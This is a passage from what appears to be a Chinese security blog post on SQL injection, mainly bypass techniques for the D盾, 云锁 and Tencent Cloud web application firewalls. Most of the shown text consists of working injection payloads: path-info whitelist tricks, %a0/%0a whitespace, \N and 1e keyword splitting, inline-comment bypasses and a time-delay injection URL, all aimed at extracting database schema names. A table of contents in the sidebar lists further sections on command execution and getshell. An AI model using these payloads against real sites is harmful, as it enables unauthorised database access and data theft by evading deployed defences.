<p><a target="_blank" rel="noopener" href="http://x.x.x.x/3.php?id=1">http:/x.x.x.x/3.php?id=1</a>    &lt;&#x3D;&gt;    <a target="_blank" rel="noopener" href="http://x.x.x.x/3.php/xxxxxxxxxxxxx?id=1">http://x.x.x.x/3.php/xxxxxxxxxxxxx?id=1</a></p>
<p>从白名单中随便挑个地址加在后面，可成功bypass，<a href="">http://10.9.10.206/3.php/admin.php?id=1  union select 1,2,schema_name from information_schema.SCHEMATA</a></p>
<p>经测试，GET、POST、COOKIE均有效，完全bypass</p>
<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/php_path_info_exp.png" alt="php_path_info_exp"></p>
<h5 id="空白字符"><a href="#空白字符" class="headerlink" title="空白字符"></a>空白字符</h5><p>Mysql中可以利用的空白字符有：%09,%0a,%0b,%0c,%0d,%20,%a0；</p>
<p>测试了一下，基本上针对MSSQL的[0x01-0x20]都被处理了，唯独在Mysql中还有一个%a0可以利用，可以看到%a0与select合体，无法识别，从而绕过。</p>
<p>id&#x3D;1  union%a0select 1,2,3 from admin</p>
<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/null_char_exp.png" alt="null_char_exp"></p>
<h5 id="N形式"><a href="#N形式" class="headerlink" title="\N形式"></a>\N形式</h5><p>主要思考问题，如何绕过union select以及select from？</p>
<p>如果说上一个姿势是union和select之间的位置的探索，那么是否可以考虑在union前面进行检测呢？</p>
<p>为此在参数与union的位置，经测试，发现\N可以绕过union select检测，同样方式绕过select from的检测。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=\Nunion(select 1,schema_name,\Nfrom information_schema.schemata)</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/N_exp.png" alt="N_exp"></p>
<h4 id="IIS-ASP-ASPX-MSSQL"><a href="#IIS-ASP-ASPX-MSSQL" class="headerlink" title="IIS+ASP&#x2F;ASPX+MSSQL"></a>IIS+ASP&#x2F;ASPX+MSSQL</h4><p>搭建IIS+ASP&#x2F;ASPX+MSSQL环境，思路一致，只是语言与数据库特性有些许差异，继续来张D盾拦截图：</p>
<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/iis_asp_mssql_d_safe.png" alt="iis_asp_mssql_d_safe"></p>
<h5 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h5><p>ASP： 不支持，找不到路径，而且D盾禁止执行带非法字符或特殊目录的脚本（&#x2F;1.asp&#x2F;x），撤底没戏了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/admin.php/../1.asp?id=1 and 1=1    拦截</span><br><span class="line">/1.asp?b=admin.php&amp;id=1 and 1=1 拦截，可见D盾会识别到文件的位置，并不是只检测URL存在白名单那么简单了</span><br></pre></td></tr></table></figure>

<p>ASPX：与PHP类似</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/1.aspx/admin.php?id=1   union select 1,&#x27;2&#x27;,TABLE_NAME from INFORMATION_SCHEMA.TABLES 可成功bypass</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/aspx_path_exp.png" alt="aspx_path_exp"></p>
<h5 id="空白字符-1"><a href="#空白字符-1" class="headerlink" title="空白字符"></a>空白字符</h5><p>Mssql可以利用的空白字符有：01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20</p>
<p>[0x01-0x20]全部都被处理了，想到mysql %a0的漏网之鱼是否可以利用一下?</p>
<p>ASP+MSSQL:  不支持%a0，已放弃</p>
<p>ASPX+MSSQL: %a0+%0a配合，可成功绕过union select的检测</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 union%a0%0aselect 1,&#x27;2&#x27;,TABLE_NAME %a0from INFORMATION_SCHEMA.TABLES</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/aspx_0a_exp.png" alt="aspx_0a_exp"></p>
<h5 id="1E形式"><a href="#1E形式" class="headerlink" title="1E形式"></a>1E形式</h5><p>MSSQL属于强类型，这边的绕过是有限制，from前一位显示位为数字类型，这样才能用1efrom绕过select from。</p>
<p>只与数据库有关，与语言无关，故ASP与ASPX一样，可bypass</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1eunion select &#x27;1&#x27;,TABLE_NAME,1efrom INFORMATION_SCHEMA.TABLES</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/1e_aspx_asp_exp.png" alt="1e_aspx_asp_exp"></p>
<h4 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h4><p><a href="">http://www.5kik.com/other/607.html</a></p>
<h3 id="2018-10-10绕过腾讯云waf并延时注入"><a href="#2018-10-10绕过腾讯云waf并延时注入" class="headerlink" title="2018-10-10绕过腾讯云waf并延时注入"></a>2018-10-10绕过腾讯云waf并延时注入</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.xxx.xxx.xxx/?a=abc%22-sleep--%111%0A(15)-%22&amp;act=1&amp;t=solution&amp;uid=8890</span><br></pre></td></tr></table></figure>

<h1 id="云锁绕过"><a href="#云锁绕过" class="headerlink" title="云锁绕过"></a>云锁绕过</h1><h2 id="union-select注入"><a href="#union-select注入" class="headerlink" title="union select注入"></a>union select注入</h2><p>核心原理：内联注释</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">union/*!60000x*/select 1--+</span><br><span class="line"></span><br><span class="line">select database/**/()--+</span><br><span class="line"></span><br><span class="line">1&#x27; -a()--+</span><br><span class="line"></span><br><span class="line">192.168.80.136/sqli/Less-1/?id=-1&#x27; union/*!60000x*//*!00000select*/ 1,2,group_concat(table_name) from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273--+</span><br></pre></td></tr></table></figure>

<h2 id="盲注入"><a href="#盲注入" class="headerlink" title="盲注入"></a>盲注入</h2><p>1’ %26%26 1&#x3D;1–+</p>
<p>未过滤函数<br>ascii<br>substr<br>benchmark</p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag"># sql注入</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2025/10/20/python%E5%AE%9E%E7%8E%B0%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/" rel="next" title="python实现越权漏洞检测">
                <i class="fa fa-chevron-left"></i> python实现越权漏洞检测
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name"></p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/">
              
                  <span class="site-state-item-count">30</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">8</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">34</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-number">1.</span> <span class="nav-text">sql注入基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B"><span class="nav-number">1.1.</span> <span class="nav-text">判断数据库类型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A3%80%E6%9F%A5%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%B7%AF"><span class="nav-number">1.2.</span> <span class="nav-text">检查注入的思路</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Mysql%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">Mysql注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-number">2.1.</span> <span class="nav-text">基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%88%E6%9C%AC"><span class="nav-number">2.1.1.</span> <span class="nav-text">查看当前数据库版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%BC%96%E7%A0%81"><span class="nav-number">2.1.2.</span> <span class="nav-text">查看当前编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E4%B8%BB%E6%9C%BA%E5%90%8D"><span class="nav-number">2.1.3.</span> <span class="nav-text">查看主机名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F"><span class="nav-number">2.1.4.</span> <span class="nav-text">查看操作系统</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%99%BB%E5%BD%95%E7%94%A8%E6%88%B7"><span class="nav-number">2.1.5.</span> <span class="nav-text">查看当前登录用户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E4%BD%BF%E7%94%A8%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">2.1.6.</span> <span class="nav-text">查看当前使用的数据库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E8%B7%AF%E5%BE%84"><span class="nav-number">2.1.7.</span> <span class="nav-text">常用路径</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%85%B3%E9%94%AE%E5%AD%97"><span class="nav-number">2.1.8.</span> <span class="nav-text">常用关键字</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="nav-number">2.1.9.</span> <span class="nav-text">运算符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E4%BB%96"><span class="nav-number">2.1.10.</span> <span class="nav-text">其他</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="nav-number">2.1.11.</span> <span class="nav-text">常用函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%97%E6%AF%8D-%E6%95%B0%E5%AD%97%E7%9B%B8%E5%85%B3"><span class="nav-number">2.1.12.</span> <span class="nav-text">字母&#x2F;数字相关</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%88%AA%E5%8F%96"><span class="nav-number">2.1.13.</span> <span class="nav-text">字符串截取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E9%87%8A"><span class="nav-number">2.1.14.</span> <span class="nav-text">注释</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%99%AE%E9%80%9A%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF"><span class="nav-number">2.2.</span> <span class="nav-text">普通注入技术</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B"><span class="nav-number">2.2.1.</span> <span class="nav-text">注入基本流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81sql%E6%B3%A8%E5%85%A5%E4%BD%8D%E7%BD%AE"><span class="nav-number">2.2.2.</span> <span class="nav-text">常见sql注入位置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E8%AF%AD%E5%8F%A5%E6%A0%BC%E5%BC%8F"><span class="nav-number">2.2.3.</span> <span class="nav-text">常见语句格式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5"><span class="nav-number">2.2.4.</span> <span class="nav-text">判断是否存在注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%B0%E5%80%BC%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">2.2.4.1.</span> <span class="nav-text">数值型注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">2.2.4.2.</span> <span class="nav-text">字符型注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="nav-number">2.2.4.3.</span> <span class="nav-text">联合查询注入</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E9%80%9A%E7%94%A8%E7%88%86%E5%BA%93%E6%95%B0%E6%8D%AE"><span class="nav-number">2.2.5.</span> <span class="nav-text">常用通用爆库数据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5"><span class="nav-number">2.2.6.</span> <span class="nav-text">常用语句</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E4%BB%96insert-update-delete%E6%B3%A8%E5%85%A5"><span class="nav-number">2.2.7.</span> <span class="nav-text">其他insert&#x2F;update&#x2F;delete注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8load-file-%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="nav-number">2.2.8.</span> <span class="nav-text">使用load_file()读取文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8into-outfile%E5%86%99%E6%96%87%E4%BB%B6"><span class="nav-number">2.2.9.</span> <span class="nav-text">使用into outfile写文件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF%EF%BC%88limit%EF%BC%8Corder%EF%BC%8C%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="nav-number">2.3.</span> <span class="nav-text">高级注入技术（limit，order，二次注入）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#limit%E5%90%8E%E9%9D%A2%E6%B3%A8%E5%85%A5"><span class="nav-number">2.3.1.</span> <span class="nav-text">limit后面注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#order-by%E5%90%8E%E9%9D%A2%E6%B3%A8%E5%85%A5"><span class="nav-number">2.3.2.</span> <span class="nav-text">order by后面注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%89%E5%9B%9E%E6%98%BE%E4%BD%8D%E7%9A%84SQL%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="nav-number">2.3.3.</span> <span class="nav-text">有回显位的SQL注入：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%E4%BD%8D%E4%BD%86%E6%98%AF%E6%9C%89%E6%8A%A5%E9%94%99%E6%8F%90%E7%A4%BA%E7%9A%84%EF%BC%9A"><span class="nav-number">2.3.4.</span> <span class="nav-text">无回显位但是有报错提示的：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#xpath%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-mysql-5-1-5%EF%BC%8Corder-by%E5%90%8E%E4%B9%9F%E5%8F%AF%E7%94%A8-%EF%BC%9A"><span class="nav-number">2.3.4.1.</span> <span class="nav-text">xpath报错注入(mysql&gt;&#x3D;5.1.5，order by后也可用)：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#floor%E4%B8%BB%E9%94%AE%E9%87%8D%E5%A4%8D%E6%8A%A5%E9%94%99%EF%BC%9A"><span class="nav-number">2.3.4.2.</span> <span class="nav-text">floor主键重复报错：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#join%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="nav-number">2.3.4.3.</span> <span class="nav-text">join报错注入：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#BIGINT%E7%AD%89%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E6%BA%A2%E5%87%BA%E6%8A%A5%E9%94%99%EF%BC%88mysql"><span class="nav-number">2.3.4.4.</span> <span class="nav-text">BIGINT等数据类型溢出报错（mysql&lt;5.5.53可用，且报错信息长度有限）：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E6%8A%A5%E9%94%99"><span class="nav-number">2.3.4.5.</span> <span class="nav-text">其他报错</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%89%E6%98%BE%E7%A4%BA%E4%BD%86%E6%98%AF%E6%97%A0%E5%9B%9E%E6%98%BE%E4%BD%8D%E7%9A%84%EF%BC%9A"><span class="nav-number">2.3.5.</span> <span class="nav-text">有显示但是无回显位的：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A0%E6%98%BE%E7%A4%BA%E6%97%A0%E5%9B%9E%E6%98%BE%E7%9A%84-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8-%EF%BC%9A"><span class="nav-number">2.3.6.</span> <span class="nav-text">无显示无回显的(时间盲注)：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B2%E6%B3%A8"><span class="nav-number">2.3.7.</span> <span class="nav-text">盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%B2%E6%B3%A8%E5%9C%BA%E6%99%AF%EF%BC%9A"><span class="nav-number">2.3.7.1.</span> <span class="nav-text">盲注场景：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8-%E5%9F%BA%E4%BA%8E%E5%93%8D%E5%BA%94"><span class="nav-number">2.3.7.2.</span> <span class="nav-text">布尔盲注-基于响应</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8-%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4"><span class="nav-number">2.3.7.3.</span> <span class="nav-text">延时盲注-基于时间</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%B2%E6%B3%A8%E5%B8%B8%E7%94%A8ascii"><span class="nav-number">2.3.7.4.</span> <span class="nav-text">盲注常用ascii</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%89%B9%E6%AE%8A%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="nav-number">2.3.8.</span> <span class="nav-text">特殊注入：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BC%95%E5%8F%B7%E9%80%83%E9%80%B8%EF%BC%9A"><span class="nav-number">2.3.8.1.</span> <span class="nav-text">引号逃逸：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E9%80%83%E9%80%B8%EF%BC%9A"><span class="nav-number">2.3.8.1.1.</span> <span class="nav-text">宽字节逃逸：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%BD%AC%E4%B9%89%E9%80%83%E9%80%B8"><span class="nav-number">2.3.8.1.2.</span> <span class="nav-text">转义逃逸</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9B%BE%E7%89%87%E6%B3%A8%E5%85%A5"><span class="nav-number">2.3.8.2.</span> <span class="nav-text">图片注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A0%86%E5%8F%A0%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="nav-number">2.3.8.3.</span> <span class="nav-text">堆叠查询注入</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E8%A6%81%E7%82%B9"><span class="nav-number">2.4.</span> <span class="nav-text">其他要点</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%98%93%E9%94%99%E7%82%B9"><span class="nav-number">2.4.1.</span> <span class="nav-text">易错点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Mysql%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7"><span class="nav-number">2.4.2.</span> <span class="nav-text">Mysql字符编码利用技巧</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9A%90%E5%BC%8F%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2"><span class="nav-number">2.4.3.</span> <span class="nav-text">隐式类型转换</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%89%88%E6%9C%AC%E7%89%B9%E6%80%A7"><span class="nav-number">2.5.</span> <span class="nav-text">版本特性</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%80%E6%96%B0%E6%8A%80%E6%9C%AF"><span class="nav-number">2.6.</span> <span class="nav-text">最新技术</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Mssql%E6%B3%A8%E5%85%A5"><span class="nav-number">3.</span> <span class="nav-text">Mssql注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-1"><span class="nav-number">3.1.</span> <span class="nav-text">基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8payload"><span class="nav-number">3.1.1.</span> <span class="nav-text">常用payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">3.2.</span> <span class="nav-text">报错注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-number">3.3.</span> <span class="nav-text">时间盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-number">3.4.</span> <span class="nav-text">布尔盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%89%B9%E6%AE%8A%E6%9F%A5%E8%AF%A2"><span class="nav-number">3.5.</span> <span class="nav-text">特殊查询</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-number">3.6.</span> <span class="nav-text">执行命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dba%E6%9D%83%E9%99%90-sa"><span class="nav-number">3.7.</span> <span class="nav-text">dba权限(sa)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#xp-cmdshell%E6%8F%90%E6%9D%83"><span class="nav-number">3.7.1.</span> <span class="nav-text">xp_cmdshell提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sp-oacreate%E6%8F%90%E6%9D%83"><span class="nav-number">3.7.2.</span> <span class="nav-text">sp_oacreate提权</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#db-owner%E6%9D%83%E9%99%90"><span class="nav-number">3.8.</span> <span class="nav-text">db_owner权限</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Log%E5%A4%87%E4%BB%BDGetshell"><span class="nav-number">3.8.1.</span> <span class="nav-text">Log备份Getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDGetshell"><span class="nav-number">3.8.2.</span> <span class="nav-text">差异备份Getshell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#public%E6%9D%83%E9%99%90"><span class="nav-number">3.9.</span> <span class="nav-text">public权限</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Oracle%E6%B3%A8%E5%85%A5"><span class="nav-number">4.</span> <span class="nav-text">Oracle注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%86%E5%88%AB%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="nav-number">4.1.</span> <span class="nav-text">识别注入点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">4.2.</span> <span class="nav-text">显错注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#oracle%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="nav-number">4.3.</span> <span class="nav-text">oracle联合查询</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#oracle%E7%9B%B2%E6%B3%A8"><span class="nav-number">4.4.</span> <span class="nav-text">oracle盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#oracle%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-number">4.4.1.</span> <span class="nav-text">oracle布尔盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#oracle%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8"><span class="nav-number">4.4.2.</span> <span class="nav-text">oracle报错盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#oracle%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8-%E5%9F%BA%E4%BA%8E%E5%87%BD%E6%95%B0%E8%B6%85%E6%97%B6"><span class="nav-number">4.4.3.</span> <span class="nav-text">oracle延时盲注-基于函数超时</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#oracle%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8-%E5%9F%BA%E4%BA%8E%E9%87%8D%E6%9F%A5%E8%AF%A2"><span class="nav-number">4.4.4.</span> <span class="nav-text">oracle延时盲注-基于重查询</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#oracle%E5%B8%A6%E5%A4%96%E4%BC%A0%E8%BE%93"><span class="nav-number">4.5.</span> <span class="nav-text">oracle带外传输</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">4.6.</span> <span class="nav-text">命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DBMS-EXPORT-EXTENSION"><span class="nav-number">4.6.1.</span> <span 